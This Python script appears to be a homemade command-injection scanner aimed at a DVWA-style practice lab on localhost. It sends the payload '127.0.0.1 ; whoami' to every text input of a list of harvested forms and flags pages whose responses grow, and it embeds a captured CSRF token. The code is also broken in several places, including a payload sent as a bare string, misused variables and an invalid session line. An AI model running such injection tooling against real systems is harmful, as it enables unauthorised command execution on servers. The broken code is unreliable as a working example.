import json, requests, concurrent.futures

activeSession = ""

def isAttackable(params):
    
    for param in params:
        if param.get('type') in ['text', 'password', 'email', 'search', 'number', 'textarea']:
            return True
    
    return False

def send_request(action, method, data):
    global activeSession
    if method == 'post':
        
        return activeSession.post(action, data = data)
    
    elif method == 'get':
        
        return activeSession.get(action, data = data)

def setBaseline(candidate):
    
    load = '127.0.0.1'
    response = send_request(candidate['action'], candidate['method'], load)
    
    baseline = {
        'url': candidate['action'],
        'status_code': response.status_code,
        'content_length': len(response.text),
    }
    
    return baseline


def rce(candiate):
    
    payload = "127.0.0.1 ; whoami"
    
    response = send_request(candiate['action'], candiate['method'], payload)
    
    result = {
        'url': candiate['action'],
        'status_code': response.status_code,
        'content_length': len(response.text),
    }
    
    return result


def injector(forms, session):
    global activeSession
    activeSession = session
    
    candidates = [f for f in forms if isAttackable(f['inputs'])]
    
    vulnerable_pages = []
    bases = []
    
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executors:
        
        baselines = (executors.submit(setBaseline, c) for c in candidates)
        
        for future in concurrent.futures.as_completed(baselines):
            baseline = future.result()
            
            bases.extend(baseline)
        
        attacks = (executors.submit(rce, c) for c in candidates)
        
        for future in concurrent.futures.as_completed(attacks):
            try:
                result = future.result()
                if result.get('status_code') == 200 and result.get('content_length') - baseline.get('content_length') > 6:
                    vulnerable_pages.append(result)
            
            except Exception as e:
                print("[#] RCE Attack Thread Error: {e}")
                
    print(vulnerable_pages)
    
    
forms = [{'found on': 'http://localhost:8081/vulnerabilities/brute/', 'action': 'http://localhost:8081/vulnerabilities/brute/', 'method': 'get', 'inputs': [{'name': 'username', 'type': 'text', 'value': ''}, {'name': 'password', 'type': 'password', 'value': ''}, {'name': 'Login', 'type': 'submit', 'value': 'Login'}]}, {'found on': 'http://localhost:8081/vulnerabilities/exec/', 'action': 'http://localhost:8081/vulnerabilities/exec/', 'method': 'post', 'inputs': [{'name': 'ip', 'type': 'text', 'value': ''}, {'name': 'Submit', 'type': 'submit', 'value': 'Submit'}]}, {'found on': 'http://localhost:8081/vulnerabilities/csrf/', 'action': 'http://localhost:8081/vulnerabilities/csrf/', 'method': 'get', 'inputs': [{'name': 'password_new', 'type': 'password', 'value': ''}, {'name': 'password_conf', 'type': 'password', 'value': ''}, {'name': 'Change', 'type': 'submit', 'value': 'Change'}]}, {'found on': 'http://localhost:8081/vulnerabilities/upload/', 'action': 'http://localhost:8081/vulnerabilities/upload/', 'method': 'post', 'inputs': [{'name': 'MAX_FILE_SIZE', 'type': 'hidden', 'value': '100000'}, {'name': 'uploaded', 'type': 'file', 'value': ''}, {'name': 'Upload', 'type': 'submit', 'value': 'Upload'}]}, {'found on': 'http://localhost:8081/vulnerabilities/captcha/', 'action': 'http://localhost:8081/vulnerabilities/captcha/', 'method': 'post', 'inputs': [{'name': 'step', 'type': 'hidden', 'value': '1'}, {'name': 'password_new', 'type': 'password', 'value': ''}, {'name': 'password_conf', 'type': 'password', 'value': ''}, {'name': 'Change', 'type': 'submit', 'value': 'Change'}]}, {'found on': 'http://localhost:8081/vulnerabilities/sqli/', 'action': 'http://localhost:8081/vulnerabilities/sqli/', 'method': 'post', 'inputs': [{'name': 'id', 'type': '', 'value': ''}, {'name': 'Submit', 'type': 'submit', 'value': 'Submit'}]}, {'found on': 'http://localhost:8081/vulnerabilities/sqli_blind/', 'action': 'http://localhost:8081/vulnerabilities/sqli_blind/', 'method': 'post', 'inputs': [{'name': 'id', 'type': '', 'value': ''}, {'name': 'Submit', 'type': 'submit', 'value': 'Submit'}]}, {'found on': 'http://localhost:8081/vulnerabilities/weak_id/', 'action': 'http://localhost:8081/vulnerabilities/weak_id/', 'method': 'post', 'inputs': [{'name': '', 'type': 'submit', 'value': 'Generate'}]}, {'found on': 'http://localhost:8081/vulnerabilities/xss_d/', 'action': 'http://localhost:8081/vulnerabilities/xss_d/', 'method': 'get', 'inputs': [{'name': 'default', 'type': '', 'value': ''}, {'name': '', 'type': 'submit', 'value': 'Select'}]}, {'found on': 'http://localhost:8081/vulnerabilities/xss_r/', 'action': 'http://localhost:8081/vulnerabilities/xss_r/', 'method': 'get', 'inputs': [{'name': 'name', 'type': 'text', 'value': ''}, {'name': '', 'type': 'submit', 'value': 'Submit'}]}, {'found on': 'http://localhost:8081/vulnerabilities/xss_s/', 'action': 'http://localhost:8081/vulnerabilities/xss_s/', 'method': 'post', 'inputs': [{'name': 'txtName', 'type': 'text', 'value': ''}, {'name': 'mtxMessage', 'type': '', 'value': ''}, {'name': 'btnSign', 'type': 'submit', 'value': 'Sign Guestbook'}, {'name': 'btnClear', 'type': 'submit', 'value': 'Clear Guestbook'}]}, {'found on': 'http://localhost:8081/vulnerabilities/csp/', 'action': 'http://localhost:8081/vulnerabilities/csp/', 'method': 'post', 'inputs': [{'name': 'include', 'type': 'text', 'value': ''}, {'name': '', 'type': 'submit', 'value': 'Include'}]}, {'found on': 'http://localhost:8081/vulnerabilities/javascript/', 'action': 'http://localhost:8081/vulnerabilities/javascript/', 'method': 'post', 'inputs': [{'name': 'token', 'type': 'hidden', 'value': ''}, {'name': 'phrase', 'type': 'text', 'value': 'ChangeMe'}, {'name': 'send', 'type': 'submit', 'value': 'Submit'}]}, {'found on': 'http://localhost:8081/security.php', 'action': 'http://localhost:8081/security.php', 'method': 'post', 'inputs': [{'name': 'security', 'type': '', 'value': ''}, {'name': 'seclev_submit', 'type': 'submit', 'value': 'Submit'}, {'name': 'user_token', 'type': 'hidden', 'value': 'c8cc1fa41b13f84090d2ce5b15363391'}]}]
session = <requests.sessions.Session object at 0x7f99a5d37f10>
injector(forms, session)
                
        
    
    